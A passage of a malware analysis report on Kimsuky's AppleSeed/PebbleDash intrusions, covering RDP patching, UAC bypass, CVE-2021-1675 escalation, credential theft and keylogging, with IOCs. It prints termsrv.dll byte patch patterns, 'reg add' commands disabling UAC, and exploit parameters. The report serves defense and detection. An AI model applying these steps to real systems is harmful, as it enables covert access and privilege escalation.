with the same feature (of adding user accounts) was\nexecuted by the privilege escalation malware. This privilege escalation malware will be discussed later in\nthis article.\n\n5.2.2. RDP Patcher\n\nOnly 1 RDP per PC is allowed in a normal Windows environment. Because of this, even if the attacker\nknows the account credentials of the infected system, he or she cannot make an RDP connection without\nthe user realizing it if the user is performing a task locally or a user is currently accessing the system using\nRDP. This is because if the attacker attempts to connect with RDP while the current user is in the\nenvironment, the current user will be logged off.\n\nTo bypass such instances, the attacker may patch the memory of Remote Desktop Service to allow\n\n64\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nexecution of multiple remote desktop sessions. For instance, Mimikatz supports such a feature with the\nts::multirdp command. The command finds the DLL address in the current running Remote Desktop\nService (svchost.exe that loaded termsrv.dll) and searches a certain binary pattern. As the pattern is\ndifferent for each Windows version, each version has a defined search pattern. When the defined pattern\nexists, the malware patches it into a new one, allowing multiple RDP to happen.\n\nThe Kimsuky group uses a type of malware that specializes in the memory patch for multiple RDP. Like\nmost of the malware strains used by the group, it is DLL and is run by regsvr32.exe. The currently\ndiscovered sample is an x64 binary, so it only operates in the x64 Windows architecture. Its search and\npatch patterns are similar to the source code of Mimikatz, but one difference is that it also supports the\nWindows XP version. The search patterns and patterns to be patched in each Windows version are as\nfollows:\n\n**Version (x64)** **Search Pattern** **Patch Pattern**\n\nWindows XP {0x83, 0xf8, 0x02, 0x7f} {0x90, 0x90}\n(2600) or above\n\nWindows Vista {0x8b, 0x81, 0x38, 0x06, 0x00, {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff,\n\n( 6000 ) 0x00, 0x39, 0x81, 0x3c, 0x06, 0xff, 0xff, 0x7f, 0x90, 0x90, 0xeb};\n\n0x00, 0x00, 0x75};\n\nWindows 7 {0x39, 0x87, 0x3c, 0x06, 0x00, {0xc7, 0x87, 0x3c, 0x06, 0x00, 0x00, 0xff,\n\n( 7600 ) 0x00, 0x0f, 0x84}; 0xff, 0xff, 0x7f, 0x90, 0x90};\n\nWindows 8.1 {0x39, 0x81, 0x3c, 0x06, 0x00, {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff,\n\n( 9600 ) 0x00, 0x0f, 0x84}; 0xff, 0xff, 0x7f, 0x90, 0x90};\n\nWindows 10, {0x8b, 0x99, 0x3c, 0x06, 0x00, {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff,\nVersion 1803 0x00, 0x8b, 0xb9, 0x38, 0x06, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90,\n\n( 17134 ) 0x00, 0x00, 0x3b, 0xdf, 0x0f, 0x90, 0xe9};\n\n0x84};\n\nWindows 10, {0x8b, 0x81, 0x38, 0x06, 0x00, {0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff,\nVersion 1809 0x00, 0x39, 0x81, 0x3c, 0x06, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90,\n(17763) or above 0x00, 0x00, 0x0f, 0x84}; 0x90, 0x90, 0x90, 0x90};\n\n**Table 28. RDP service search and patch patterns**\n\n5.3. Privilege Escalation\n\n5.3.1. UACMe\n\nThe privilege escalation routine for AppleSeed that was mentioned earlier shows that if the following\nregistry keys all have a value of 0 (meaning that UAC is disabled), the malware executes recursion with\nthe admin privilege. In a normal environment, the keys are not disabled because of security reasons.\n\n|Version (x64)|Search Pattern|Patch Pattern|\n|---|---|---|\n|Windows XP (2600) or above|{0x83, 0xf8, 0x02, 0x7f}|{0x90, 0x90}|\n|Windows Vista ( 6000 )|{0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x75};|{0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0xeb};|\n|Windows 7 ( 7600 )|{0x39, 0x87, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};|{0xc7, 0x87, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};|\n|Windows 8.1 ( 9600 )|{0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};|{0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90};|\n|Windows 10, Version 1803 ( 17134 )|{0x8b, 0x99, 0x3c, 0x06, 0x00, 0x00, 0x8b, 0xb9, 0x38, 0x06, 0x00, 0x00, 0x3b, 0xdf, 0x0f, 0x84};|{0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0xe9};|\n|Windows 10, Version 1809 (17763) or above|{0x8b, 0x81, 0x38, 0x06, 0x00, 0x00, 0x39, 0x81, 0x3c, 0x06, 0x00, 0x00, 0x0f, 0x84};|{0xc7, 0x81, 0x3c, 0x06, 0x00, 0x00, 0xff, 0xff, 0xff, 0x7f, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90};|\n\n\n\n- HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n\nㄴ ConsentPromptBehaviorAdmin\n\n- HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\n\n\nㄴ PromptOnSecureDesktop\n\nAfter installing AppleSeed, the attacker used manually patched UACMe to disable UAC. UACMe is an\nopen-source project that is made public on GitHub. It is a command line tool that incorporates known UAC\nBypass Methods. In other words, it is an open-source tool that supports dozens of UAC Bypass features.\n\n65\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nThe attacker built UACMe in the form of DLL so that it can be run with regsvr32.exe like AppleSeed and\nused the ICMLuaUtil interface among UACMe features to bypass UAC.[4]\n\n**Figure 67. UAC Bypass technique using ICMLuaUtil**\n\nThe technique uses a certain undocumented method that is exported from the ICMLuaUtil interface. Like\nthe ShellExecute() API, the method receives the pathname of the target that will be run as an argument\nand executes it. Unlike the API, it executes it as admin privilege without the UAC pop-up. As the method\nis not patched even in the latest Windows version, the technique is used by multiple malware strains. For\ninstance, as Pitou Boot Kit malware needs admin privilege to infect MBR and reboot the system, it uses\nCMSTPLUA to do so. GandCrab ransomware that was distributed in the NSIS packer form in the past\nalso used CMSTPLUA.[5]\n\n\n\n- CMSTPLUA : { 3E5FC7F9-9A51-4367-9063-A120244FBEC7 }\n\n- ICMLuaUtil : { 6EDD6D74-C007-4E75-B76A-E5740995E24C }\n\n\n4 [https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=8709a7d6-561a-4df3-8bd1-](https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=8709a7d6-561a-4df3-8bd1-a5fedce07717)\n\n[a5fedce07717](https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=8709a7d6-561a-4df3-8bd1-a5fedce07717) (Analysis Report on Privilege Escalation Using UAC Bypass)\n\n5 [https://asec.ahnlab.com/ko/1160/](https://asec.ahnlab.com/ko/1160/) (GandCrab v4.3 distributed in the Nullsoft installer form)\n\n\n66\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nThe malware executes the command line commands shown below. When the malware is executed by\nbeing loaded through regsvr32.exe, it automatically bypasses UAC by using a certain method of\nICMLuaUtil and executes the command line commands to configure registry keys that disable UAC.\n\n\ncmd /c\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v\nPromptOnSecureDesktop /t REG_DWORD /d 0 /f\n&\nreg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v\nConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f\n\n\n5.3.2. CVE-2021-1675 Vulnerability\n\nThe Kimsuky group has also been using the privilege escalation vulnerability. The malware installed\nthrough AppleSeed escalates privilege by using the CVE-2021-1675 vulnerability.\n\nCVE-2021-1675 is a privilege escalation vulnerability of the Windows Printer Spooler service. It can exploit\nthe vulnerability of the AddPrinterDriverEx() API to operate a malicious DLL designated by the attacker\nwith escalated privilege. AddPrinterDriverEx() is a function that installs local or remote printer drivers and\nconnects configuration, data, and driver files. If sending '0x8014' value to the fourth argument\n(dwFileCopyFlags) of the API to bypass the privilege verification of 'SeLoadDriverPrivilege,' and entering\na malicious DLL path in the DriverInfo struct of pConfigFile to call, the malicious DLL that is sent as the\nargument is loaded and the attacker can execute the malicious DLL with escalated privilege.\n\nThe malware used by the Kimsuky group is created based on the following GitHub open source, but there\ncertain differences are noticeable when comparing it with the original source code.[6]\n\n**Figure 68. CVE-2021-1675 vulnerability routine**\n\nOne noticeable difference is that while the original source code uses the EnumPrinterDrivers() API to\n\n6 [https://github.com/hlldz/CVE-2021-1675-LPE/](https://github.com/hlldz/CVE-2021-1675-LPE/)\n\n67\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\npinpoint the location of the printer driver file unidrv.dll in the infected system, this malware contains the\npath shown below, hard-coded. The path is also found on the current latest version of Windows\n10.0.19043.1348, but it might be different depending on the OS version. It seems that the attacker had\nalready collected the information of the target PC in advance and developed the malware based on the\ninformation.\n\n**- Hard-coded Path:**\nc:\\Windows\\System32\\DriverStore\\FileRepository\\ntprint.inf_amd64_c62e9f8067f98247\\Amd64\\UNID\nRV.DLL\n\nThe DLL registered through the malware was collected with the name lala.dll, which disables UAC and\nadds accounts. The aforementioned UACMe uses UAC Bypass to configure the following registry and\ndisable UAC with escalated privilege, and lala.dll also performs the same feature.\n\n**Registry Path** **Settings Value (Description)**\n\nHKLM\\SoftWare\\Microsoft\\Windows\\CurrentVersion\\ 0 (Not verified upon admin privilege\n\nPolicies\\System\\ConsentPromptBehaviorAdmin escalation)\n\nHKLM\\SoftWare\\Microsoft\\Windows\\CurrentVersion\\ 0 (Not switched to secure desktop upon\n\nPolicies\\System\\PromptOnSecureDesktop admin privilege escalation)\n\n**Table 29. Registry value change related to admin privilege escalation**\n\nOne difference the malware has with UACMe is that it additionally adds an RDP user account after\nprivilege escalation. The account added is the same as the one from the malware that adds the user\naccount mentioned earlier. Yet while the sample created through the PIF dropper uses the command line\ncommands, the current one sets the registry using the API.\n\n**Figure 69. Adding user account using API**\n\n68\n\n|Registry Path|Settings Value (Description)|\n|---|---|\n|HKLM\\SoftWare\\Microsoft\\Windows\\CurrentVersion\\ Policies\\System\\ConsentPromptBehaviorAdmin|0 (Not verified upon admin privilege escalation)|\n|HKLM\\SoftWare\\Microsoft\\Windows\\CurrentVersion\\ Policies\\System\\PromptOnSecureDesktop|0 (Not switched to secure desktop upon admin privilege escalation)|\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nOne thing to note is that the DLL has the following PDB path. It seems that the Kimsuky group is using\nthe CVE-2021-34527 (PrintNightmare) vulnerability to launch their attacks, with the sample probably being\nused for attacks exploiting the vulnerability.\n\n**- PDB Path: E:\\Peacock\\exploit\\Privilege Escalation\\night dll add new admin user\\CVE-2021-34527-**\nmaster\\nightmare-dll\\x64\\Release\\nightmare.pdb\n\n5.4. Collecting Information\n\n5.4.1. Mimikatz\n\nThe reason the attacker escalates privilege by using tools such as UACMe is to take over the entire\ndomain via lateral movement in the internal infrastructure. To move laterally within the system, one needs\nto collect account credentials. Mimikatz is one of the main tools used for such a purpose as it needs to be\nrun as administrator to steal account credentials within the system.[7] The attacker additionally installs\nMimikatz, or Powerkatz, to be precise.\n\n**Figure 70. Command options upon running Powerkatz**\n\n7 [https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=cc8cf212-f3ca-4134-812d-](https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=cc8cf212-f3ca-4134-812d-0e471d888923)\n\n[0e471d888923](https://atip.ahnlab.com/ti/contents/issue-report/malware-analysis?i=cc8cf212-f3ca-4134-812d-0e471d888923) (Analysis Report of the Internal Propagation Technique Using Mimikatz)\n\n69\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n5.4.2. Collecting Chrome Account Credentials\n\nWhile the following malware is built incorrectly and does not operate normally, it can be used to steal\ninformation. Like most of the malware strains used by the group, it is DLL and is run by regsvr32.exe. It\nsteals cookie information and user account credentials stored in the Chrome web browser and saves in a\ntext form in the following path.\n\n**- Save Path for Information Stolen from Chrome: C:\\ProgramData\\Adobe\\mui.db**\n\nThe information that is parsed and decrypted is saved as domain, name, path, and value if it is a cookie.\nFor account credentials, they are saved as url, user, and pass. If the malware works normally, the saved\nresults are likely to be stolen by the backdoor such as AppleSeed or PebbleDash and sent to the C&C\nserver.\n\n**Figure 71. Chrome web browser cookies and account credentials saved in mui.db file**\n\n5.4.3. Keylogger\n\nKeylogger is a DLL-form malware that is also run by regsvr32.exe. As seen below, the malware was\ncollected from inside the AhnLab folder of the ProgramData folder, and it existed as a file named install.cfg.\n\n**- Path for Collecting Keylogger Malware: %ALLUSERSPROFILE%\\ahnlab\\install.cfg**\n\nThe attacker also disguised results and settings files below as AhnLab product-related settings files by\ncreating them with names such as ahnlab.cfg and uninstall.cfg.\n\n70\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nWhen Keylogger is executed for the first time, it checks for the current privilege. It injects itself as DLL into\nwinlogon.exe in case of admin privilege and explorer.exe if not. Upon being run, it creates and scans the\nfollowing mutex to prevent concurrent execution.\n\n**- Mutex: windows certs server [pid]**\n\nIt checks the following path for the existence of uninstall.cfg. If the file exists, keylogging is stopped. The\nmalware does not directly communicate with the C&C server and only performs keylogging features. As\nsuch, the attacker may send a command to stop keylogging through backdoor such as AppleSeed or\nPebbleDash, creating a file in the path shown below.\n\n**- Keylogging Command Data File: %ALLUSERSPROFILE%\\AhnLab\\uninstall.cfg**\n\nKeylogger malware uses GetAsyncKeyState() and GetKeyState() functions to steal the current user's\nkeyboard input information and saves it in a temporary file of the %TEMP% path. Keylogger then\nperiodically copies the keylogging data saved in the %TEMP% path to the path shown below. It appears\nthat the saved results are stolen by the backdoor and sent to the C&C server.\n\n\n\n**- Keylogging Data File: %ALLUSERSPROFILE%\\AhnLab\\ahnlab.cfg**\n\n\n**Figure 72. Keylogging data saved in ahnlab.cfg file**\n\n5.5. Others\n\n5.5.1. Proxy Malware\n\nAppleSeed also creates Proxy malware. The malware has the PDB path named localproxy as shown\nbelow.\n\n**- PDB Path: D:\\Troy\\FProxy\\output\\x64\\localproxy.pdb**\n\nAs its name suggests, the malware has a proxy feature and receives 2 IP addresses and port numbers\n\n71\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nfrom the command line argument to relay them. You can see from the routine below that it simply sends\nthe buffer it has received back to the remote address without going through any conversion processes.\n\n\n\n**- Command Line Argument: help:localproxy.exe RemoteIP RemotePort InternelIP InternelPort**\n\n\n**Figure 73. Proxy Routine**\n\nCurrently, no command line logs can be seen via the ASD infrastructure, but the ASEC team was able to\nfind the history of the malware communicating with the URL shown below. It is identical to the C&C server\naddress and the port number used in Meterpreter. While the proxy itself can be used in various forms, it\nappears that it was used to relay C&C communications of Meterpreter.\n\n\n\n**- Remote Access History: 27.255.81[.]109:3015**\n\n\nAhnLab's Response\n\nThe alias and the engine version information of AhnLab products are shown below. Even if the threat\ngroup's activities were recently discovered, AhnLab products may have detected related malware in the\npast. The ASEC team is tracking the activities of the group and is responding to related malware types,\nbut there may be unidentified alterations that are yet to be detected.\n\nBackdoor/JS.Akdoor (2021.04.23.00)\nBackdoor/Win.Agent.R421553 (2021.10.14.03)\nBackdoor/Win.Akdoor.C4715493 (2021.10.22.02)\nBackdoor/Win.Akdoor.C4715520 (2021.10.22.02)\nBackdoor/Win.Akdoor.R417157 (2021.04.23.00)\nBackdoor/Win.AppleSeed.C4635545 (2021.10.14.03)\nBackdoor/Win.AppleSeed.C4646719 (2021.10.14.02)\nBackdoor/Win.AppleSeed.C4646724 (2021.10.14.02)\nBackdoor/Win.AppleSeed.C4646725 (2021.10.14.02)\nBackdoor/Win.AppleSeed.C4699440 (2021.10.14.03)\nBackdoor/Win.AppleSeed.C4702267 (2021.10.15.01)\nBackdoor/Win.AppleSeed.C4702268 (2021.10.15.01)\nBackdoor/Win.AppleSeed.C4705211 (2021.10.18.03)\nBackdoor/Win.AppleSeed.C4713932 (2021.10.21.00)\nBackdoor/Win.AppleSeed.C4719084 (2021.10.24.01)\nBackdoor/Win.AppleSeed.R335261 (2021.10.15.01)\n\n72\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nBackdoor/Win.AppleSeed.R335738 (2020.05.09.00)\nBackdoor/Win.AppleSeed.R336437 (2020.05.14.00)\nBackdoor/Win.AppleSeed.R441519 (2021.10.14.03)\nBackdoor/Win.AppleSeed.R444289 (2021.10.14.03)\nBackdoor/Win.AppleSeed.R445451 (2021.10.15.01)\nBackdoor/Win.AppleSeed.R445453 (2021.10.15.01)\nBackdoor/Win.AppleSeed.R445842 (2021.10.18.03)\nBackdoor/Win.Keylogger.R419909 (2021.10.14.03)\nBackdoor/Win.Meterpreter.C4705209 (2021.10.18.03)\nBackdoor/Win.VNC.C4589952 (2021.10.14.03)\nBackdoor/Win32.Agent.R338775 (2020.06.01.03)\nBackdoor/Win32.Kimsuky.R341619 (2020.06.25.03)\nBackdoor/Win64.Akdoor.C4148267 (2020.07.01.04)\nBackdoor/Win64.Akdoor.C4176420 (2020.08.05.05)\nBackdoor/Win64.Akdoor.C4250525 (2020.12.04.04)\nBackdoor/Win64.Akdoor.C4251494 (2020.12.08.03)\nBackdoor/Win64.Akdoor.R179345 (2016.04.22.05)\nBackdoor/Win64.Akdoor.R181647 (2016.05.20.00)\nBackdoor/Win64.Akdoor.R197899 (2017.04.03.03)\nBackdoor/Win64.Akdoor.R357381 (2020.12.08.06)\nBackdoor/Win64.Keylogger.R353447 (2020.10.20.04)\nDownloader/Win.Agent.C4510706 (2021.10.15.00)\nDownloader/Win64.Agent.C4318031 (2021.02.01.04)\nDropper/JS.Agent (2021.08.26.03)\nDropper/JS.Akdoor (2021.10.07.00)\nDropper/JS.Generic (2021.05.08.00)\nDropper/Win.Agent.C4520969 (2021.10.15.00)\nDropper/Win.Akdoor.C4656487 (2021.09.28.00)\nDropper/Win.AppleSeed.C4699439 (2021.10.14.03)\nDropper/Win32.Infostealer.R332952 (2020.04.16.08)\nDropper/Win64.Akdoor.R194398 (2017.01.26.00)\nDropper/WSF.Agent (2021.05.13.02)\nExploit/Win.CVE-2021-1675.C4584875 (2021.08.09.03)\nExploit/Win.CVE-2021-34527.R436236 (2021.08.09.03)\nMalware/Gen.Reputation.C4269991 (2020.12.23.04)\nTrojan/Win.Agent.C4382841 (2021.10.14.03)\nTrojan/Win.Agent.C4457973 (2021.10.15.01)\nTrojan/Win.Agent.C4520953 (2021.10.14.03)\nTrojan/Win.Agent.C4522294 (2021.06.11.02)\nTrojan/Win.Agent.C4524918 (2021.10.14.03)\nTrojan/Win.Agent.C4705973 (2021.10.19.00)\nTrojan/Win.Agent.C4714244 (2021.10.21.03)\nTrojan/Win.Agent.R416026 (2021.10.14.03)\nTrojan/Win.Agent.R420433 (2021.10.14.03)\nTrojan/Win.Agent.R422617 (2021.10.14.03)\nTrojan/Win.Agent.R425110 (2021.10.14.03)\nTrojan/Win.Agent.R436488 (2021.10.14.03)\nTrojan/Win.Akdoor.C4522181 (2021.10.14.03)\nTrojan/Win.Akdoor.C4522184 (2021.06.11.00)\nTrojan/Win.Akdoor.C4589941 (2021.08.13.03)\nTrojan/Win.Akdoor.C4596140 (2021.08.18.00)\nTrojan/Win.Akdoor.C4700226 (2021.10.15.00)\nTrojan/Win.Akdoor.C4728343 (2021.10.27.00)\nTrojan/Win.Akdoor.R425112 (2021.10.14.03)\nTrojan/Win.Akdoor.R426485 (2021.10.15.00)\nTrojan/Win.Akdoor.R436752 (2021.08.13.03)\nTrojan/Win.Akdoor.R445441 (2021.10.15.01)\nTrojan/Win.Akdoor.R446906 (2021.10.24.02)\n\n\n73\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nTrojan/Win.Appleseed.R428102 (2021.10.15.01)\nTrojan/Win.Generic.C4609881 (2021.08.27.02)\nTrojan/Win.HVNC.C4635546 (2021.10.14.03)\nTrojan/Win.Keylogger.C4719085 (2021.10.24.01)\nTrojan/Win.KeyLogger.R422003 (2021.10.14.03)\nTrojan/Win.LightShell.R435857 (2021.08.07.00)\nTrojan/Win.LightShell.R436719 (2021.08.13.02)\nTrojan/Win.LightShell.R439086 (2021.10.14.03)\nTrojan/Win.LightShell.R439839 (2021.09.02.03)\nTrojan/Win.LightShell.R445352 (2021.10.15.00)\nTrojan/Win.Meterpreter.R430231 (2021.10.14.03)\nTrojan/Win.Mimikatz.C4521006 (2021.06.09.02)\nTrojan/Win.Mimikatz.C4717867 (2021.10.23.01)\nTrojan/Win.NukeSped.R415643 (2021.10.14.03)\nTrojan/Win.Proxicon.R436042 (2021.08.09.03)\nTrojan/Win.RDPatcher.R445454 (2021.10.15.01)\nTrojan/Win.Stealer.C4768269 (2021.11.12.03)\nTrojan/Win.Tinukebot.R415647 (2021.10.14.03)\nTrojan/Win.TinyNuke.C4633235 (2021.10.14.03)\nTrojan/Win.TinyNuke.C4702254 (2021.10.15.01)\nTrojan/Win.TinyNuke.R435917 (2021.10.14.03)\nTrojan/Win.VNC.C4318018 (2021.10.14.03)\nTrojan/Win.VNC.C4589940 (2021.10.14.03)\nTrojan/Win.VNC.C4633124 (2021.09.16.00)\nTrojan/Win.VNC.R435919 (2021.10.14.03)\nTrojan/Win.VNC.R436747 (2021.10.14.03)\nTrojan/Win32.Agent.C4003499 (2020.02.29.06)\nTrojan/Win32.Agent.C4179369 (2020.08.12.03)\nTrojan/Win32.Agent.R344880 (2020.07.16.00)\nTrojan/Win32.Agent.R350149 (2020.09.03.08)\nTrojan/Win32.Agent.R353325 (2020.10.17.09)\nTrojan/Win32.Agent.R357752 (2020.12.19.00)\nTrojan/Win32.Akdoor.C2030137 (2017.07.06.02)\nTrojan/Win32.Akdoor.R183070 (2016.06.09.07)\nTrojan/Win32.Akdoor.R183787 (2016.07.22.02)\nTrojan/Win32.Akdoor.R333041 (2020.04.17.00)\nTrojan/Win32.Infostealer.R338043 (2020.05.26.02)\nTrojan/Win32.MalPacked.C4196972 (2020.09.17.00)\nTrojan/Win32.Rdpwrap.R232017 (2018.11.26.07)\nTrojan/Win64.Agent.C4318029 (2021.02.01.04)\nTrojan/Win64.Agent.R337075 (2020.05.20.10)\nTrojan/Win64.Agent.R337893 (2020.05.25.03)\nTrojan/Win64.Agent.R338576 (2020.05.29.04)\nTrojan/Win64.Agent.R350150 (2020.09.03.09)\nTrojan/Win64.Agent.R354559 (2020.11.01.00)\nTrojan/Win64.Agent.R367595 (2021.02.23.00)\nTrojan/Win64.Akdoor.R354720 (2020.11.04.00)\nTrojan/Win64.Akdoor.R355472 (2020.11.12.04)\nTrojan/Win64.Loader.C4019677 (2020.03.18.00)\nTrojan/WSF.Runner (2020.11.12.04)\nUnwanted/Win.Rdpwrap.C2410573 (2021.04.20.00)\nUnwanted/Win32.Rdpwrap.C2632304 (2018.07.26.01)\n\n\n74\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\nConclusion\n\nKimsuky group is continuously launching social engineering attacks, such as spear phishing, against\ncompanies, public institutions, and individual users. Recent cases have shown frequent uses of malware\nAppleSeed and PebbleDash. Such backdoors can stay in the system, receive commands from the\nattacker, and perform various malicious tasks. As various malware strains for remote control and collecting\ninformation are additionally installed, companies and users targeted by the Kimsuky group are at risk of\nhaving key information within the system stolen.\n\nWhen there is a suspicious-looking email in the inbox, users must refrain from opening the attached files\nwithin the email. Also, anti-malware solutions, such as AhnLab V3, must be regularly updated to the latest\nversion to prevent malware infections.\n\nIOC (Indicators of Compromise)\n\nSome IOCs were referred to third-party analysis reports. Thus, some were not verified as the sample\ncould not be confirmed. The content may be updated without notice if new information is found.\n\nFile Path and Name\n\nThe file paths and names used from the threat group are listed below. Some malware and tool file may\nhave the same name as that of normal files.\n\n**Script**\nimage_confirm_v2.wsf\nBiden Administration Security Figures.wsf\nPlan for Establishing Control Tower in North Korea Denuclearization.wsf\n2021 **** Missions Service Survey.hwp.js\nKorean-Japan Relations.js\n*** News 2021-05-07.pdf jse\n\n**PIF Dropper**\nJR_210604_R1***_F***_Pf***.pif - (Certain strings blurred as ***)\nColon Cancer Case.pif\nProgress Check_211013.pdf file\n211014-915mm(0deg).h5.pif\n210927 Covid-19 Response (Boryeong-Taean 1)_merged_edited.PIF\n1. 2021 Business Plan (Supplemented by referencing materials from Installation Agency) - 210316-1.pif\nROK-US summit (May 21st) Reference Material (edited).pif\n2021 *** Work Report Edited.pif\n\n**Downloader**\n%ALLUSERSPROFILE%\\Intel\\Driverdriver.cfg\n%ALLUSERSPROFILE%\\Intel\\driver.cfg\n%APPDATA%\\Intel\\Driverdriver.cfg\n\n**AppleSeed Installation Path**\n%ALLUSERSPROFILE%\\Software\\Ahnlab\\Service\\AutoService.dll\n%ALLUSERSPROFILE%\\Software\\ControlSet\\Service\\ServiceScheduler.dll\n%ALLUSERSPROFILE%\\Software\\Defender\\Windows\\Update\\AutoUpdate.dll\n%ALLUSERSPROFILE%\\Software\\ESTsoft\\Common\\ESTCommon.dll\n\n75\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n%ALLUSERSPROFILE%\\Software\\KakaoTalk\\KaoUpdate.ini\n%ALLUSERSPROFILE%\\Software\\Microsoft\\AvastAntiVirus\\AvastUpdate.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Avg\\AvgSkin.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Network\\NetworkService.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Printer\\PrinterService.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Service\\TaskScheduler.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\AutoDefender\\UpdateDB.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\AutoPatch\\patch.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Chrome\\GoogleUpdate.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\WIndows\\Defender\\AutoCheck.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Defender\\AutoUpdate.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Defender\\update.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Explorer\\FontChecker.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\FontChecker.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\MDF\\WDFSync\\WDFSync.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\MetaSec\\MetaSecurity.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Patch\\patch.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Patch\\plugin.dll\n%ALLUSERSPROFILE%\\Software\\Microsoft\\Windows\\Secrity\\AutoCheck.dll\n%ALLUSERSPROFILE%\\Software\\Office\\Update.dll\n%APPDATA%\\ESTsoft\\AlLUpdat\\AlCommon.dll\n%APPDATA%\\ESTsoft\\AlLUpdate\\AlCommon.dll\n%APPDATA%\\ESTsoft\\Common\\ESTCommon.dll\n%APPDATA%\\ESTsoft\\Common\\ESTUpdate.exe\n%APPDATA%\\ESTsoft\\Common\\ko-kr.dll\n%APPDATA%\\ESTsoft\\updat\\ESTCommon.dll\n%APPDATA%\\Microsoft\\Windows\\Defender\\AutoUpdate.dll\n%APPDATA%\\Microsoft\\Windows\\Defender\\patch.dll\n\n**Meterpreter**\n%ALLUSERSPROFILE%\\edge\\mtp.db\n%ALLUSERSPROFILE%\\Intel\\1060\\update1060.cfg\n%ALLUSERSPROFILE%\\intel\\bin\\update.cfg\n%ALLUSERSPROFILE%\\m.db\n%ALLUSERSPROFILE%\\ma.dat\n%ALLUSERSPROFILE%\\ma.db\n%ALLUSERSPROFILE%\\msedge\\mtp.db\n%ALLUSERSPROFILE%\\mt79.dat\n%ALLUSERSPROFILE%\\mtp.dat\n%ALLUSERSPROFILE%\\mtp.db\n%ALLUSERSPROFILE%\\s\\mtp.db\n%ALLUSERSPROFILE%\\update.db\n%SystemDrive%\\mav.db\n%SystemDrive%\\netclient\\k.txt\n%SystemDrive%\\netclient\\km.xml\n\n**HVNC**\n%ALLUSERSPROFILE%\\mac\\hvnc.db\n%ALLUSERSPROFILE%\\s\\hvnc.db\n%ALLUSERSPROFILE%\\hvnc.dat\n\n**TightVNC**\n%ALLUSERSPROFILE%\\edge\\tvnc.db\n%ALLUSERSPROFILE%\\msedge\\tvnc.db\n%ALLUSERSPROFILE%\\s\\tvnc.dat\n%ALLUSERSPROFILE%\\tvn.db\n%ALLUSERSPROFILE%\\tvnc.dat\n\n\n76\n\n\n-----\n\nAnalysis Report of Kimsuky Group s APT Attacks (AppleSeed, PebbleDash)\n\n**RDP Wrapper**\n%ALLUSERSPROFILE%\\rdp\\rdpconf.exe\n%ALLUSERSPROFILE%\\rdp\\rdpwinst.exe\n%ProgramFiles%\\rdp wrapper\\rdpwrap.dll\n\n**Malware for Adding 